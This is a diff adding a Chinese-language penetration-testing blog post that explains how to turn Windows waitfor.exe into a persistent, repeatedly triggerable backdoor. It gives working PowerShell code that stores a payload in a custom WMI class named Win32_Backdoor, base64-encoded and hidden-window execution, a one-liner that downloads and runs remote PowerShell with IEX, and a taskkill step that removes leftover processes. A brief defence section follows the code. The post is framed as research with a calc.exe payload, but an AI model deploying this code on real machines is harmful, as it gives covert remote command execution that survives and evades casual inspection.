@@ -1,0 +1,375 @@
+<article class="post">
+  <h1>Use Waitfor.exe to maintain persistence</h1>
+
+  <div class="entry">
+    <h2 id="0x00-前言">0x00 前言</h2>
+<hr>
+
+<p>从Casey Smith‏@subTee的Twitter上获得的一个思路，利用Waitfor.exe有可能实现一种后门机制。
+于是我对其做了进一步研究，并且使用Powershell写了一个后门利用的POC。
+本文将要介绍Waitfor.exe在渗透测试中的利用技巧，并且分享开发POC的思路和细节。</p>
+
+<p>完整POC下载地址如下：</p>
+
+<p>https://github.com/3gstudent/Waitfor-Persistence</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr>
+
+<p>本文将要具体介绍以下内容：</p>
+
+<ul>
+  <li>Waitfor.exe简介</li>
+  <li>利用思路</li>
+  <li>POC细节</li>
+</ul>
+
+<h2 id="0x02-waitforexe简介">0x02 Waitfor.exe简介</h2>
+<hr>
+
+<p>用来同步网络中计算机，可以发送或等待系统上的信号</p>
+
+<p><strong>支持系统：</strong></p>
+
+<ul>
+  <li>Windows Server 2003</li>
+  <li>Windows Vista</li>
+  <li>Windows XP</li>
+  <li>Windows Server 2008</li>
+  <li>Windows 7</li>
+  <li>Windows Server 2003 with SP2</li>
+  <li>Windows Server 2003 R2</li>
+  <li>Windows Server 2008 R2</li>
+  <li>Windows Server 2000</li>
+  <li>Windows Server 2012</li>
+  <li>Windows Server 2003 with SP1</li>
+  <li>Windows 8</li>
+  <li>Windows 10</li>
+  <li>其他Server系统未测试，理论上支持</li>
+</ul>
+
+<p>位于System32文件夹下，以命令行方式启动</p>
+
+<p>支持参数如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-7/2-1.png" alt="Alt text"></p>
+
+<p><strong>具体细节如下：</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/s &lt;Computer&gt;：指定发送的目的计算机的名称或IP地址（不能使用反斜杠）。如果不加此参数，将会在域内以广播形式发送
+
+/u [&lt;Domain&gt;\]&lt;User&gt;：使用指定用户帐户的凭据运行脚本。如果不加此参数，表示使用当前用户的凭据
+
+/p [&lt;Password&gt;]：用户密码
+
+/si：表示发送信号，用于激活，如果不加此参数，表示等待接收信号
+
+/t &lt;Timeout&gt;：指定等待信号的秒数。如果不加此参数，表示无限期等待
+
+&lt;SignalName&gt;：指定的信号名称，大小写不敏感，长度不能超过225个字符
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<blockquote>
+  <p>Computers can only receive signals if they are in the same domain as the computer sending the signal.</p>
+</blockquote>
+
+<p>即同一网段的主机才能接收信号</p>
+
+<p><strong>主要用途：</strong></p>
+
+<p>实现同一网段内的主机同时执行命令</p>
+
+<h3 id="测试实例">测试实例：</h3>
+
+<p><strong>开启等待模式：</strong></p>
+
+<p>cmd：</p>
+
+<p><code class="language-plaintext highlighter-rouge">waitfor signalcalc &amp;&amp; calc.exe</code></p>
+
+<p>参数说明：</p>
+
+<ul>
+  <li>信号名称： signalcalc</li>
+  <li>接收信号后的操作：calc.exe，即启动计算器</li>
+</ul>
+
+<p>此时，后台存在进程waitfor.exe</p>
+
+<p><strong>发送信号：</strong></p>
+
+<p>cmd：</p>
+
+<p><code class="language-plaintext highlighter-rouge">waitfor /s 127.0.0.1 /si signalcalc</code></p>
+
+<p>参数说明：</p>
+
+<ul>
+  <li>目的计算机：127.0.0.1（本机测试使用），域内使用换成主机ip</li>
+  <li>/si表示发送信号</li>
+  <li>信号名称： signalcalc</li>
+</ul>
+
+<p>详细操作如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-7/1-1.gif" alt="Alt text"></p>
+
+<p><strong>注：</strong></p>
+
+<p>更多基本介绍可参照微软官方文档，链接如下：</p>
+
+<p>https://technet.microsoft.com/en-us/library/cc731613(v=ws.11).aspx</p>
+
+<h2 id="0x03-利用思路">0x03 利用思路</h2>
+<hr>
+
+<p>根据以上的基本介绍，最直观的认识，waitfor可被当作后门来使用</p>
+
+<p>Daniel Bohannon‏ @danielhbohannon在twitter上分享了他的利用思路：将waitfor接收信号后的操作设置为从远程服务器下载powershell代码并执行</p>
+
+<p>地址如下：</p>
+
+<p>https://twitter.com/danielhbohannon/status/872258924078092288</p>
+
+<p>细节如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-7/2-2.png" alt="Alt text"></p>
+
+<p>此外，他还提到了一个有趣的技巧：如果将powershell代码设置为延期执行，那么接收信号后，后台将不存在进程waitfor.exe</p>
+
+<p>我验证了这个结论，方法如下：</p>
+
+<p><strong>开启等待模式：</strong></p>
+
+<p>cmd：</p>
+
+<p><code class="language-plaintext highlighter-rouge">waitfor test1 &amp;&amp; &amp;&amp; powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/3gstudent/test/master/calc2.ps1')</code></p>
+
+<p><strong>发送信号：</strong></p>
+
+<p>cmd：</p>
+
+<p><code class="language-plaintext highlighter-rouge">waitfor /s 127.0.0.1 /si test1</code></p>
+
+<p>https://raw.githubusercontent.com/3gstudent/test/master/calc2.ps1的内容如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Start-Sleep -Seconds 10;
+start-process calc.exe;
+</code></pre></div></div>
+
+<p>当成功接收信号后，进程waitfor.exe退出</p>
+
+<p>接着执行powershell脚本，等待10秒再启动calc.exe</p>
+
+<p>这10秒内，只存在进程powershell.exe</p>
+
+<p>也就是说，如果把等待时间设置更长，那么再这一段等待时间内不存在进程waitfor.exe，提醒防御者注意这个细节</p>
+
+<h2 id="0x04-poc细节">0x04 POC细节</h2>
+<hr>
+
+<p>如果作为一个后门，那么上面的利用方法还不够成熟</p>
+
+<p>因为触发一次后，进程waitfor.exe将退出，导致该后门无法重复使用</p>
+
+<p>需要再次开启一个等待模式，才能再次触发后门</p>
+
+<p>当然，可以在每次后门触发后手动开启一个等待模式</p>
+
+<p>但这不够智能，能否通过脚本实现自动开启等待模式，使其成为一个可持续触发的后门呢？</p>
+
+<p>为此，我写了以下POC</p>
+
+<h3 id="思路1">思路1：</h3>
+
+<p>在目标系统保存一个ps脚本1.ps1</p>
+
+<p>1.ps1内容如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>start-process calc.exe
+cmd /c waitfor persist `&amp;`&amp; powershell -executionpolicy bypass -file c:\test\1.ps1
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>转义字符&amp;在powershell中要用`&amp;表示</p>
+
+<p><strong>开启等待模式：</strong></p>
+
+<p>cmd：</p>
+
+<p><code class="language-plaintext highlighter-rouge">waitfor persist1 &amp;&amp; powershell -executionpolicy bypass -file c:\test\1.ps1</code></p>
+
+<p><strong>发送信号：</strong></p>
+
+<p>cmd：</p>
+
+<p><code class="language-plaintext highlighter-rouge">waitfor /s 127.0.0.1 /si persist1</code></p>
+
+<h3 id="思路2">思路2：</h3>
+
+<p>不在目标系统保存文件</p>
+
+<p>这里使用一个之前在《WMI backdoor》中介绍过的技巧，将payload保存在WMI类中，进行读取使用</p>
+
+<p>存储payload：</p>
+
+<p>（管理员权限）</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$StaticClass = New-Object Management.ManagementClass('root\cimv2', $null,$null)
+$StaticClass.Name = 'Win32_Backdoor'
+$StaticClass.Put()
+$StaticClass.Properties.Add('Code' , "cmd /c start calc.exe")
+$StaticClass.Put() 
+</code></pre></div></div>
+
+<p>读取payload：</p>
+
+<p><code class="language-plaintext highlighter-rouge">([WmiClass] 'Win32_Backdoor').Properties['Code'].Value</code></p>
+
+<p>以上操作如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-7/3-1.png" alt="Alt text"></p>
+
+<p>执行payload：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$exec=([WmiClass] 'Win32_Backdoor').Properties['Code'].Value;
+iex $exec
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>通过Invoke-Expression执行命令也可以，使用iex是为了缩短长度</p>
+
+<p>结合waitfor的参数格式，这里选择将代码编码为base64</p>
+
+<p>对执行payload的代码进行base64编码，以下代码保存在code.txt：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$exec=([WmiClass] 'Win32_Backdoor').Properties['Code'].Value;
+iex $exec
+</code></pre></div></div>
+
+<p>对其进行base64编码，代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$code = Get-Content -Path code.txt
+$bytes  = [System.Text.Encoding]::UNICODE.GetBytes($code);
+$encoded = [System.Convert]::ToBase64String($bytes)
+$encoded 
+</code></pre></div></div>
+
+<p>获得base64加密代码如下：</p>
+
+<p><code class="language-plaintext highlighter-rouge">JABlAHgAZQBjAD0AKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwBXAGkAbgAzADIAXwBCAGEAYwBrAGQAbwBvAHIAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAQwBvAGQAZQAnAF0ALgBWAGEAbAB1AGUAOwAgAGkAZQB4ACAAJABlAHgAZQBjAA==</code></p>
+
+<p>以上操作如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-7/3-2.png" alt="Alt text"></p>
+
+<p>测试base64加密代码：</p>
+
+<p><code class="language-plaintext highlighter-rouge">powershell -nop -E JABlAHgAZQBjAD0AKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwBXAGkAbgAzADIAXwBCAGEAYwBrAGQAbwBvAHIAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAQwBvAGQAZQAnAF0ALgBWAGEAbAB1AGUAOwAgAGkAZQB4ACAAJABlAHgAZQBjAA==</code></p>
+
+<p>成功执行代码，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-7/3-3.png" alt="Alt text"></p>
+
+<p>根据以上思路，POC如下：</p>
+
+<p>后门代码：</p>
+
+<p>（管理员权限）</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$StaticClass = New-Object Management.ManagementClass('root\cimv2', $null,$null)
+$StaticClass.Name = 'Win32_Backdoor'
+$StaticClass.Put()
+$StaticClass.Properties.Add('Code' , "cmd /c start calc.exe ```&amp;```&amp; waitfor persist ```&amp;```&amp; powershell -nop -E JABlAHgAZQBjAD0AKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwBXAGkAbgAzADIAXwBCAGEAYwBrAGQAbwBvAHIAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAQwBvAGQAZQAnAF0ALgBWAGEAbAB1AGUAOwAgAGkAZQB4ACAAJABlAHgAZQBjAA==")
+$StaticClass.Put() 
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>存在两次转义字符</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ``用来表示`
+</code></pre></div></div>
+
+<p>安装代码：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$exec=([WmiClass] 'Win32_Backdoor').Properties['Code'].Value;
+iex $exec
+</code></pre></div></div>
+
+<p>激活命令：</p>
+
+<p><code class="language-plaintext highlighter-rouge">waitfor /s 127.0.0.1 /si persist</code></p>
+
+<p>实际测试如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-7/3-4.png" alt="Alt text"></p>
+
+<p>存在bug，导致powershell.exe无法正常退出，进程在后台残留</p>
+
+<p>所以需要添加一段代码，用来结束进程powershell.exe</p>
+
+<p><strong>注：</strong></p>
+
+<p>根据逻辑关系，结束powershell.exe的代码要写在<code class="language-plaintext highlighter-rouge">powershell -nop -W Hidden -E ...</code>之前</p>
+
+<p>最终，完整POC代码如下：</p>
+
+<p>后门代码：</p>
+
+<p>（管理员权限）</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$StaticClass = New-Object Management.ManagementClass('root\cimv2', $null,$null)
+$StaticClass.Name = 'Win32_Backdoor'
+$StaticClass.Put()| Out-Null
+$StaticClass.Properties.Add('Code' , "cmd /c start calc.exe ```&amp;```&amp; taskkill /f /im powershell.exe ```&amp;```&amp; waitfor persist ```&amp;```&amp; powershell -nop -W Hidden -E JABlAHgAZQBjAD0AKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwBXAGkAbgAzADIAXwBCAGEAYwBrAGQAbwBvAHIAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAQwBvAGQAZQAnAF0ALgBWAGEAbAB1AGUAOwAgAGkAZQB4ACAAJABlAHgAZQBjAA==")
+$StaticClass.Put() | Out-Null
+
+$exec=([WmiClass] 'Win32_Backdoor').Properties['Code'].Value;
+iex $exec | Out-Null
+</code></pre></div></div>
+
+<p>激活命令：</p>
+
+<p><code class="language-plaintext highlighter-rouge">waitfor /s 127.0.0.1 /si persist</code></p>
+
+<p>完整演示如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-7/1-2.gif" alt="Alt text"></p>
+
+<p>不存在进程残留的问题</p>
+
+<h2 id="0x05-防御">0x05 防御</h2>
+<hr>
+
+<p>留意后台进程waitfor.exe</p>
+
+<p>对于后台的可疑进程cmd.exe和powershell.exe，可使用Process Explorer查看其启动参数，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-7/3-5.png" alt="Alt text"></p>
+
+<p>也可以读取以上进程中的历史回显内容，参考资料如下：</p>
+
+<p>http://jblog.javelin-networks.com/blog/cli-powershell/</p>
+
+<h2 id="0x06-小结">0x06 小结</h2>
+<hr>
+
+<p>本文介绍了Waitfor.exe后门的实现思路，也许还会有更多的利用技巧</p>
+
+<hr>
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+  </div>
+
+  <div class="date">
+    Written on June  7, 2017
+  </div>
+
+  
+</article>
